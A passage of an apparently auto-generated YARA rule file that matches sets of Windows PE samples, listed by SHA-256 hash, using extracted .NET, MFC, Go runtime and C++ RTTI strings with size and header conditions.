      $s6 = "AfxWnd90s" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s7 = "AfxControlBar90s" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s8 = "AfxFrameOrView90s" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s9 = "AfxMDIFrame90s" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_36 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20, a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash3 = "43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
      hash4 = "a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172"
      hash5 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash6 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash7 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "16.0.0.0" fullword ascii /* score: '6.00'*/
      $s3 = "Microsoft.VisualBasic" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.90'*/ /* Goodware String - occured 98 times */
      $s4 = "sender" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.04'*/ /* Goodware String - occured 960 times */
      $s5 = "untimeResourceSet" fullword ascii /* score: '4.00'*/
      $s6 = "System.Reflection" fullword ascii /* PEStudio Blacklist: strings */ /* score: '2.81'*/ /* Goodware String - occured 2186 times */
      $s7 = "b03f5f7f11d50a3a" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f_d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36_37 {
   meta:
      description = "dataset - from files 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91, bb4fe58a0d6cbb1237d46f2952d762cc, b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174, 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f, b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff, 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618, 7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243, 24197e271f0a1ae404e7e136a4d79d4e90537c18b4c598bef0801e32ca63b8c0, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076, 61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d, 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, 1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00, a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c, ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 6402b33d729c8bb44881747a8f397f4aec408bf5e18b9af6fd86cdfa3f96323b, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43, ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583, 35e5460c102ca2f996d61d70d6bb06fb87014f7d2beccf35f3812ea534acd9d5, 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50, 0c71dcca7d39fd895a7b772ccd2370fc94f5e34423d87974c49f4d1c24cf103b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash2 = "d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91"
      hash3 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash4 = "b1b01e971e60a4fa4b8b6b46861eda6ace5d0483136b3d1a45bcb2ebeda96174"
      hash5 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash6 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash7 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      hash8 = "b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff"
      hash9 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      hash10 = "7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
      hash11 = "24197e271f0a1ae404e7e136a4d79d4e90537c18b4c598bef0801e32ca63b8c0"
      hash12 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      hash13 = "61dc296d1b2aa4724f3b0a44a53863613d61df9de4ee8e0a01f2d33b80169a4d"
      hash14 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash15 = "1fb13a158aff3d258b8f62fe211fabeed03f0763b2acadbccad9e8e39969ea00"
      hash16 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      hash17 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      hash18 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      hash19 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash20 = "6402b33d729c8bb44881747a8f397f4aec408bf5e18b9af6fd86cdfa3f96323b"
      hash21 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      hash22 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      hash23 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash24 = "a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
      hash25 = "35e5460c102ca2f996d61d70d6bb06fb87014f7d2beccf35f3812ea534acd9d5"
      hash26 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      hash27 = "0c71dcca7d39fd895a7b772ccd2370fc94f5e34423d87974c49f4d1c24cf103b"
   strings:
      $s1 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s2 = " Base Class Descriptor at (" fullword ascii /* score: '6.00'*/
      $s3 = " Class Hierarchy Descriptor'" fullword ascii /* score: '6.00'*/
      $s4 = " Complete Object Locator'" fullword ascii /* score: '5.00'*/
      $s5 = " delete[]" fullword ascii /* score: '4.00'*/
      $s6 = " delete" fullword ascii /* score: '3.00'*/
      $s7 = " new[]" fullword ascii /* score: '1.00'*/
      $s8 = " Base Class Array'" fullword ascii /* score: '0.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x534d ) and filesize < 12000KB and ( all of them )
      ) or ( all of them )
}

rule _7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_38 {
   meta:
      description = "dataset - from files 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash3 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "*[]runtime.gcSweepBuf" fullword ascii /* score: '12.00'*/
      $s2 = "*runtime.gcSweepBuf" fullword ascii /* score: '12.00'*/
      $s3 = "*[2]runtime.gcSweepBuf" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.heapBits.setCheckmarked" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.contains" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.index" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.largeAlloc" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.mSysStatDec" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.heapBits.isCheckmarked" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.heapBits.initCheckmarkSpan" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.heapBits.clearCheckmarkSpan" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.mSysStatInc" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.clearCheckmarks" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.initCheckmarks" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.tracebackinit" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.mallocgc.func1" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.skipPleaseUseCallersFrames" fullword ascii /* score: '9.00'*/
      $s18 = "sweepSpans" fullword ascii /* score: '9.00'*/
      $s19 = "nlargefree" fullword ascii /* score: '8.00'*/
      $s20 = "nlargealloc" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_39 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash7 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $s1 = "strconv.rangeError" fullword ascii /* score: '10.00'*/
      $s2 = "strconv.bitSizeError" fullword ascii /* score: '10.00'*/
      $s3 = "reflect.Value.SetComplex" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.convT16" fullword ascii /* score: '10.00'*/
      $s5 = "strconv.baseError" fullword ascii /* score: '10.00'*/
      $s6 = "strconv.syntaxError" fullword ascii /* score: '10.00'*/
      $s7 = "internal/poll.(*FD).GetFileType" fullword ascii /* score: '9.00'*/
      $s8 = " *func(int64, int) (int64, error)" fullword ascii /* score: '7.00'*/
      $s9 = "reflect.Indirect" fullword ascii /* score: '7.00'*/
      $s10 = "*strconv.NumError" fullword ascii /* score: '7.00'*/
      $s11 = "io.ReadAtLeast" fullword ascii /* score: '7.00'*/
      $s12 = "\"*func([]uint8, int64) (int, error)" fullword ascii /* score: '7.00'*/
      $s13 = "reflect.Value.SetInt" fullword ascii /* score: '7.00'*/
      $s14 = "os.(*File).pread" fullword ascii /* score: '7.00'*/
      $s15 = "internal/poll.(*FD).Pread" fullword ascii /* score: '7.00'*/
      $s16 = "reflect.Value.SetUint" fullword ascii /* score: '7.00'*/
      $s17 = "io/ioutil.ReadFile" fullword ascii /* score: '7.00'*/
      $s18 = "strconv.(*NumError).Error" fullword ascii /* score: '7.00'*/
      $s19 = "reflect.Value.SetFloat" fullword ascii /* score: '7.00'*/
      $s20 = "math.Float32frombits" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_40 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash3 = "43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
      hash4 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash5 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash6 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s2 = "m_ThreadStaticValue" fullword ascii /* score: '7.00'*/
      $s3 = "ThreadSafeObjectProvider`1" fullword ascii /* score: '7.00'*/
      $s4 = "Hashtable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.36'*/ /* Goodware String - occured 645 times */
      $s5 = "MySettingsProperty" fullword ascii /* score: '4.00'*/
      $s6 = "Dispose__Instance__" fullword ascii /* score: '4.00'*/
      $s7 = "Create__Instance__" fullword ascii /* score: '4.00'*/
      $s8 = "My.Settings" fullword ascii /* score: '4.00'*/
      $s9 = "MyProject" fullword ascii /* score: '4.00'*/
      $s10 = "MySettings" fullword ascii /* score: '4.00'*/
      $s11 = "Property can only be set to Nothing" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "get_Computer" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s13 = "AccountDomainSid" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s14 = "LateGet" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842_4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e633_41 {
   meta:
      description = "dataset - from files ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842, 4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8, 21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f, 7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476, cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326, 712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932, 2edaa2518d319f9c0e97e337c7b41921477d857af96018f56207c5abdad74c38"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842"
      hash2 = "4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8"
      hash3 = "21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f"
      hash4 = "7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476"
      hash5 = "cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326"
      hash6 = "712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932"
      hash7 = "2edaa2518d319f9c0e97e337c7b41921477d857af96018f56207c5abdad74c38"
   strings:
      $s1 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s2 = "1wwwr\"gf@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s3 = "wr\"\"gf@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s4 = "Gggfv@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s5 = "wr'\"\"@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s6 = "wr\"\"&f@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s7 = "&vvggd" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s8 = "wwgbvt" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s9 = "1wwwr\"vv@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s10 = "ww\"w\"\"@" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f_e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920_42 {
   meta:
      description = "dataset - from files 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f, e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076, 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      hash2 = "e5bb8537cc3a7cb763ac60ab6efb0d11844d34bec9ef28b9052fdad920f07076"
      hash3 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
   strings:
      $s1 = "L9zPtD9{" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = ".fD9afu" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "t0fD9`fu" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "L9zXtZH" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "L9zhtZH" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "D$`L9f@tAH" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = "\\$`HcS" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_43 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash3 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash4 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash5 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s2 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s3 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s4 = "m_MyWebServicesObjectProvider" fullword ascii /* score: '7.00'*/
      $s5 = "My.WebServices" fullword ascii /* score: '7.00'*/
      $s6 = "m_UserObjectProvider" fullword ascii /* score: '7.00'*/
      $s7 = "m_ComputerObjectProvider" fullword ascii /* score: '7.00'*/
      $s8 = "MyWebServices" fullword ascii /* score: '7.00'*/
      $s9 = "GetResourceString" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.88'*/ /* Goodware String - occured 124 times */
      $s10 = "m_AppObjectProvider" fullword ascii /* score: '4.00'*/
      $s11 = "m_MyFormsObjectProvider" fullword ascii /* score: '4.00'*/
      $s12 = "My.User" fullword ascii /* score: '4.00'*/
      $s13 = "MyForms" fullword ascii /* score: '4.00'*/
      $s14 = "m_FormBeingCreated" fullword ascii /* score: '4.00'*/
      $s15 = "My.MyProject.Forms" fullword ascii /* score: '4.00'*/
      $s16 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "b03f5f7f11d50a3aB" ascii /* score: '1.00'*/
      $s18 = "My.Forms" fullword ascii /* score: '1.00'*/
      $s19 = "My.Application" fullword ascii /* score: '0.00'*/
      $s20 = "MyApplication" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9_0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732d_44 {
   meta:
      description = "dataset - from files dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash2 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
   strings:
      $s1 = "get_ListBox1" fullword ascii /* score: '9.00'*/
      $s2 = "get_Button4" fullword ascii /* score: '9.00'*/
      $s3 = "get_Button5" fullword ascii /* score: '9.00'*/
      $s4 = "set_Button3" fullword ascii /* score: '4.00'*/
      $s5 = "set_Button4" fullword ascii /* score: '4.00'*/
      $s6 = "Button2_Click" fullword ascii /* score: '4.00'*/
      $s7 = "set_Button2" fullword ascii /* score: '4.00'*/
      $s8 = "Button3_Click" fullword ascii /* score: '4.00'*/
      $s9 = "set_Button5" fullword ascii /* score: '4.00'*/
      $s10 = "Button4_Click" fullword ascii /* score: '4.00'*/
      $s11 = "Button1_Click" fullword ascii /* score: '4.00'*/
      $s12 = "set_ListBox1" fullword ascii /* score: '4.00'*/
      $s13 = "ListBox1" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "Label3_Click" fullword ascii /* score: '4.00'*/
      $s15 = "Button5_Click" fullword ascii /* score: '4.00'*/
      $s16 = "set_Button1" fullword ascii /* score: '4.00'*/
      $s17 = "get_Button1" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "get_Button2" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "get_Button3" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s20 = "Button5" fullword wide /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83_2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252f_45 {
   meta:
      description = "dataset - from files 7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83, 2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252ff64281, 9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39, 923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce, 32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c, 956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83"
      hash2 = "2160af903da06c25c2f6426931d20eb7e7a8ea6f9951e144188027252ff64281"
      hash3 = "9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39"
      hash4 = "923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce"
      hash5 = "32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c"
      hash6 = "956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
   strings:
      $s1 = "content2,the7" fullword wide /* score: '9.00'*/
      $s2 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s3 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s4 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s5 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s6 = "frommountainwasfF537" fullword wide /* score: '5.00'*/
      $s7 = "F13Daenables" fullword ascii /* score: '4.00'*/
      $s8 = "betaorNUMFL" fullword wide /* score: '4.00'*/
      $s9 = "mNoalong" fullword wide /* score: '4.00'*/
      $s10 = "forensicnumber,1BranchactivityasksLinux" fullword wide /* score: '4.00'*/
      $s11 = "d38subsequentu0thumbnailsapplet" fullword wide /* score: '4.00'*/
      $s12 = "loadblayoutChromeandwillie" fullword wide /* score: '4.00'*/
      $s13 = "wnUlifeTheofficialt" fullword wide /* score: '4.00'*/
      $s14 = "bubbaYHjGooglebeforeschoolRsecurity" fullword wide /* score: '4.00'*/
      $s15 = "theirxqcrashes.4444inlalso" fullword wide /* score: '4.00'*/
      $s16 = "m3bookmarks,kfIqb" fullword wide /* score: '4.00'*/
